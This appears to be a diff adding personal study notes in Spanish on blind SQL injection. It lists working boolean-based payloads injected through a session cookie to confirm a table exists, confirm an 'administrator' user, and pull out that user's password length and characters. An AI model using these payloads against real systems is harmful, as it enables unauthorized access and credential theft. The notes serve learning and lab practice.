@@ -145,3 +145,36 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 sqlmap hackthebox guide:
 https://medium.com/@joshthedev/step-13-sqlmap-essentials-68829d907492
 
+
+#####################Blind sqli
+
+En las sqli la página no va a devolver resultados, pero podremos robar información de a pocas "fracciones" comparando el
+resultado.
+por ejemplo, 
+podríamos comprobar si una cookie de session es vulnerable agregando un booleano:
+cookie' and 1='1
+cookie' and 1='2
+de esta manera si al enviar la primera request continuamos logueados, pero al enviar la segunda,no, podemos entender que
+aunque no disponga información en la página, podemos inyectar código sql.
+
+averiguar la existencia de una tabla:
+cookie' AND (SELECT 'a' FROM users LIMIT 1)='a
+
+si da true, la tabla existe.
+
+averiguar un usuario dentro de una tabla:
+cookie' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+si la respuesta es true, entonces el usuario existe
+
+averiguar contraseñas por medio de sqli:
+
+averiguar longitud del password:
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>NUMERO_DE_LONGITUD_A_PREGUNTAR)='a
+podemos ajustar el número hasta encontrarnos un false.
+
+cookie' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+
+siguiendo el ejemplo anterior, si la primer letra del password es 's', nos mantendremos logeados, de lo contrario, nos
+desloguearemos.
+
+
